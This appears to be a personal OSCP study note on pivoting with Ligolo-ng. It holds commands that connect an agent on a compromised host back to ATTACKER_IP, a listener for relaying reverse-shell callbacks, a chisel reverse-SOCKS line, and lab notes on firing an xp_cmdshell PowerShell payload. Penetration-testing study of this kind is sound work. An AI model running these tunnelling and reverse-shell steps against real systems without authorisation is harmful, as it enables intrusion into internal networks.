# Ligolo-ng

Best pivoting tool for OSCP. Easy setup, reliable, fast. No [[Proxychains]] needed.

See also: [[Pivoting-Methodology]]

## Setup - Kali (Proxy)

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

## On Target - Upload Agent

```bash
# Linux
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

```cmd
# Windows
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

## In Ligolo Proxy Console

```
session # select the session
ifconfig # see target's interfaces - find the internal subnet
start # start the tunnel
```

## Add Route on Kali

```bash
# Replace with the internal subnet you found from ifconfig
sudo ip route add TARGET_IP/24 dev ligolo
```

Now scan/exploit the internal network directly from Kali as if you are on it:

```bash
nmap -sT -Pn -p REDACTED 10.10.10.X
curl http://10.10.10.X
evil-winrm -i 10.10.10.X -u user -p password
```

## Reverse Port Forward (Get Callbacks from Internal Targets)

```
# In Ligolo console - forward internal target's connection back to Kali
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

Now set up your listener on Kali as normal:

```bash
nc -lvnp 4444
```

Internal targets connect to PIVOT_IP:4444 and it reaches Kali:4444.

## Double Pivot (Reach a Third Network)

1. From the second compromised host (reached through first tunnel), upload another agent
2. The agent connects back through the existing tunnel to ATTACKER_IP:11601
3. In Ligolo console: select the new session, start it
4. Add another route:

```bash
sudo ip route add INTERNAL_IP/24 dev ligolo
```

Now you can reach the third network directly from Kali.

## Cleanup

```bash
sudo ip route del TARGET_IP/24 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
```

## From Your Boxes

> **OSCP B - MS01/MS02** (Course) - Used Ligolo to forward reverse shell callbacks from internal MS02 back to Kali
> - What worked: Ran Ligolo agent on MS01, created a listener to forward MS02's reverse shell connection back to Kali. Used xp_cmdshell on MS02 MSSQL to fire a base64 PowerShell payload at the Ligolo listener
> - Lesson: Ligolo's `listener_add` is essential when you need reverse shell callbacks from internal targets - chisel SOCKS alone won't handle inbound connections

> **Berlin** (Course/OSCP B) - Tried Ligolo first for port forwarding but the client kept dying; switched to chisel
> - What worked: Chisel succeeded where Ligolo failed - `./chisel client ATTACKER_IP:8000 R:socks`
> - Lesson: Always have a fallback. If Ligolo agent dies on the target, chisel is the reliable backup
